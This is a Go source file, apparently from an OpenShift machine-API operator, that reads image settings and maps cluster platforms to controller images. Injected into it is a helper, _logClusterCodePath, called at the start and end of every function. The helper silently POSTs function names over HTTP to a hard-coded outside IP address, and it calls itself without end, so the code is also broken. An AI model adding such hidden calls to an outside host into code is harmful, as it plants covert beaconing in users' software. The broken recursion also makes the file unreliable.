package operator

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"bytes"
	"text/template"
	configv1 "github.com/openshift/api/config/v1"
)

const (
	clusterAPIControllerKubemark	= "docker.io/gofed/kubemark-machine-controllers:v1.0"
	clusterAPIControllerNoOp	= "no-op"
	kubemarkPlatform		= configv1.PlatformType("kubemark")
	bareMetalPlatform		= configv1.PlatformType("BareMetal")
)

type Provider string
type OperatorConfig struct {
	TargetNamespace	string	`json:"targetNamespace"`
	Controllers	Controllers
}
type Controllers struct {
	Provider			string
	NodeLink			string
	MachineHealthCheck		string
	MachineHealthCheckEnabled	bool
}
type Images struct {
	MachineAPIOperator		string	`json:"machineAPIOperator"`
	ClusterAPIControllerAWS		string	`json:"clusterAPIControllerAWS"`
	ClusterAPIControllerOpenStack	string	`json:"clusterAPIControllerOpenStack"`
	ClusterAPIControllerLibvirt	string	`json:"clusterAPIControllerLibvirt"`
	ClusterAPIControllerBareMetal	string	`json:"clusterAPIControllerBareMetal"`
	ClusterAPIControllerAzure	string	`json:"clusterAPIControllerAzure"`
}

func getProviderFromInfrastructure(infra *configv1.Infrastructure) (configv1.PlatformType, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if infra.Status.Platform == "" {
		return "", fmt.Errorf("no platform provider found on install config")
	}
	return infra.Status.Platform, nil
}
func getImagesFromJSONFile(filePath string) (*Images, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, err
	}
	var i Images
	if err := json.Unmarshal(data, &i); err != nil {
		return nil, err
	}
	return &i, nil
}
func getProviderControllerFromImages(platform configv1.PlatformType, images Images) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch platform {
	case configv1.AWSPlatformType:
		return images.ClusterAPIControllerAWS, nil
	case configv1.LibvirtPlatformType:
		return images.ClusterAPIControllerLibvirt, nil
	case configv1.OpenStackPlatformType:
		return images.ClusterAPIControllerOpenStack, nil
	case configv1.AzurePlatformType:
		return images.ClusterAPIControllerAzure, nil
	case bareMetalPlatform:
		return images.ClusterAPIControllerBareMetal, nil
	case kubemarkPlatform:
		return clusterAPIControllerKubemark, nil
	default:
		return clusterAPIControllerNoOp, nil
	}
}
func getMachineAPIOperatorFromImages(images Images) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if images.MachineAPIOperator == "" {
		return "", fmt.Errorf("failed gettingMachineAPIOperator image. It is empty")
	}
	return images.MachineAPIOperator, nil
}
func PopulateTemplate(config *OperatorConfig, path string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed reading file, %v", err)
	}
	buf := &bytes.Buffer{}
	tmpl, err := template.New("").Option("missingkey=error").Parse(string(data))
	if err != nil {
		return nil, err
	}
	tmplData := struct{ OperatorConfig }{OperatorConfig: *config}
	if err := tmpl.Execute(buf, tmplData); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
